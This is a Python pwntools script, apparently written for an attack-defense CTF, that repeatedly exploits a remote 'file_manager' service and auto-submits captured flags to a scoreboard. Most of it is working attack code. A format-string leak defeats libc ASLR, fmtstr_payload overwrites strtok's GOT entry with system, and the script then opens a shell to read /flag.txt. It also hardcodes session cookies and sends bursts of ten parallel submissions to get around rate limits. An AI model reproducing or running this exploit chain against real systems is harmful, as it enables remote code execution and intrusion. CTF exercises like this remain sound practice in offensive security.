#!/usr/bin/env python3
from pwn import *
import requests
import re
import time
from datetime import datetime
import signal
from concurrent.futures import ThreadPoolExecutor, as_completed

# --------------------------------------------------------------------------------
# CONFIG
# --------------------------------------------------------------------------------
BINARY = "./file_manager"
HOST = "35.240.149.115"
PORT = 1337

SUBMIT_URL = "https://ad.cscv.vn/submitflag_API"

COOKIES = {
    "x_polaris_sid": "C1TwfNoZE5PH|Tp3to8FCz9nN0|Wmfd8LULN",
    "x_polaris_cid": "C1Twfnhk6tQ94OumExKhYz2WqOw2Boyzy3UZ",
    "session": "2b7ec366-f1f2-4fdf-aac0-6b103ecd61d1.yjc0FmihMytkLedpWn8kSRES8a0",
    "x_polaris_sd": "ns7VrAP83ewp7VfBgLXtvB0F68cXBfRLXEyg48cm|4k2mau/dV4qP7aX68Dgq3C6/30Eo2LsxSI61p1Kasj7vgAkIWCkQ8mcxO4s4F6B8dNmxJYg453tLCnB4dA1W2l!"
}

TEAM = "MTA.ADC"
DAEMON = "Pwn01"

# ULTIMATE CONFIG
CHECK_INTERVAL = 1      # Check mỗi 1s
BURST_CHECK = 5         # Burst 5 lần khi có flag mới
PARALLEL_SUBMITS = 10   # Mỗi flag mới gửi 10 requests
SUBMIT_TIMEOUT = 2
EXPLOIT_TIMEOUT = 5

# --------------------------------------------------------------------------------
# EXPLOIT SETUP
# --------------------------------------------------------------------------------
context.binary = exe = ELF(BINARY, checksec=False)
context.log_level = "error"
context.timeout = 1
libc = exe.libc

submitted_flags = set()

class TimeoutException(Exception):
    pass

def timeout_handler(signum, frame):
    raise TimeoutException()

def get_flag_fast():
    """Ultra-fast exploit"""
    p = None
    signal.signal(signal.SIGALRM, timeout_handler)
    signal.alarm(EXPLOIT_TIMEOUT)
    
    try:
        p = remote(HOST, PORT, level='error')

        def q(s): p.sendline(s)
        def r(): p.recvuntil(b"> ", timeout=0.8)
        
        username = f"h{int(time.time()*1000000)%1000000}".encode()
        q(b"register")
        p.sendlineafter(b"Username: ", username, timeout=0.8)
        p.sendlineafter(b"Password: ", b"123", timeout=0.8)
        r()
        q(b"login")
        p.sendlineafter(b"Username: ", username, timeout=0.8)
        p.sendlineafter(b"Password: ", b"123", timeout=0.8)
        r()

        q(b"write leak.txt")
        p.sendlineafter(b"Enter content as hex string", b"%15$p".hex().encode(), timeout=0.8)
        r()
        q(b"cat leak.txt")
        out = p.recvuntil(b"> ", timeout=0.8)
        
        m = re.search(rb"0x[0-9a-fA-F]+", out)
        if not m:
            signal.alarm(0)
            p.close()
            return None

        libc.address = int(m.group(0), 16) - 0x601b3
        payload = fmtstr_payload(6, {exe.got["strtok"]: libc.symbols["system"]}, write_size="short")
        
        q(b"write pwn.txt")
        p.sendlineafter(b"Enter content as hex string", payload.hex().encode(), timeout=0.8)
        r()
        q(b"cat pwn.txt")
        r()

        q(b"/bin/sh")
        time.sleep(0.15)
        p.sendline(b"cat /flag.txt")
        response = p.recv(1024, timeout=1.5)
        
        for line in response.decode(errors='ignore').split('\n'):
            line = line.strip()
            if line and (line.startswith('CSCV') or '{' in line):
                signal.alarm(0)
                p.close()
                return line
        
        signal.alarm(0)
        p.close()
        return None

    except:
        signal.alarm(0)
        if p: p.close()
        return None

def submit_single(flag, req_id):
    """Single submit request"""
    try:
        r = requests.post(
            SUBMIT_URL,
            data={"team": TEAM, "daemon": DAEMON, "action": "submit-flag", "flag": flag},
            cookies=COOKIES,
            headers={"Origin": "https://ad.cscv.vn", "Referer": "https://ad.cscv.vn/final"},
            allow_redirects=False,
            timeout=SUBMIT_TIMEOUT
        )

        alert_match = re.search(r'alert\(["\']([^"\']+)["\']\)', r.text)
        alert = alert_match.group(1) if alert_match else "No response"

        return {
            'id': req_id,
            'success': r.status_code in [200, 302],
            'alert': alert
        }
    except Exception as e:
        return {'id': req_id, 'success': False, 'alert': f"Error: {str(e)}"}

def multi_submit(flag):
    """Submit với 10 requests parallel"""
    results = []
    with ThreadPoolExecutor(max_workers=PARALLEL_SUBMITS) as executor:
        futures = [executor.submit(submit_single, flag, i+1) for i in range(PARALLEL_SUBMITS)]
        for future in as_completed(futures):
            results.append(future.result())
    
    results.sort(key=lambda x: x['id'])
    
    # Group alerts
    alert_count = {}
    for r in results:
        alert = r.get('alert', 'Unknown')
        alert_count[alert] = alert_count.get(alert, 0) + 1
    
    # Print compact
    success = sum(1 for r in results if r['success'])
    print(f"      └─ {success}/{PARALLEL_SUBMITS} OK", end="")
    
    # Print unique alerts
    for alert, count in alert_count.items():
        print(f" | [{count}x] {alert}", end="")
    print()
    
    # Check acceptance
    accepted = any('already' not in r.get('alert', '').lower() and 
                   'rate limit' not in r.get('alert', '').lower() 
                   for r in results if r['success'])
    
    return accepted

def main():
    print("=" * 80)
    print(f"[*] ULTIMATE Auto Exploit - Team: {TEAM} | Daemon: {DAEMON}")
    print(f"[*] Target: {HOST}:{PORT}")
    print(f"[*] Strategy: Burst check + {PARALLEL_SUBMITS}x parallel submits (MAXIMUM SPEED!)")
    print("=" * 80)
    
    checks = 0
    new_flags = 0
    accepted = 0
    last_flag = None
    consecutive_same = 0
    
    try:
        while True:
            checks += 1
            ts = datetime.now().strftime("%H:%M:%S")
            
            print(f"[{ts}] #{checks:3d} ", end="", flush=True)
            
            flag = get_flag_fast()
            
            if not flag:
                print("✗")
                time.sleep(CHECK_INTERVAL)
                continue
            
            if flag == last_flag:
                consecutive_same += 1
                print(f"⊗ (x{consecutive_same})")
                time.sleep(CHECK_INTERVAL)
                continue
            
            # NEW FLAG!
            consecutive_same = 0
            last_flag = flag
            
            print(f"\n  [⚡] NEW: {flag}")
            
            if flag in submitted_flags:
                print(f"      └─ Skip: already submitted before")
                time.sleep(CHECK_INTERVAL)
                continue
            
            # MULTI-SUBMIT
            print(f"      ├─ Launching {PARALLEL_SUBMITS}x requests...", end="", flush=True)
            is_accepted = multi_submit(flag)
            
            submitted_flags.add(flag)
            new_flags += 1
            if is_accepted:
                accepted += 1
            
            # BURST MODE
            print(f"      ├─ Burst checking {BURST_CHECK}x...")
            burst_flags = []
            for i in range(BURST_CHECK):
                time.sleep(0.3)
                bf = get_flag_fast()
                if bf and bf != flag and bf not in submitted_flags:
                    print(f"      │  ├─ Burst #{i+1}: NEW! {bf}")
                    print(f"      │  │  └─ Submitting {PARALLEL_SUBMITS}x...", end="", flush=True)
                    is_acc = multi_submit(bf)
                    submitted_flags.add(bf)
                    new_flags += 1
                    if is_acc:
                        accepted += 1
                    burst_flags.append(bf)
                    flag = bf  # Update for next burst
            
            print(f"      └─ Stats: {accepted} accepted | {new_flags} new | {len(submitted_flags)} unique")
            
            time.sleep(CHECK_INTERVAL)
            
    except KeyboardInterrupt:
        print("\n" + "=" * 80)
        rate = f"{accepted/new_flags*100:.1f}%" if new_flags > 0 else "N/A"
        print(f"[!] Checks: {checks} | New: {new_flags} | Accepted: {accepted} ({rate})")
        print("=" * 80)

if __name__ == "__main__":
    main()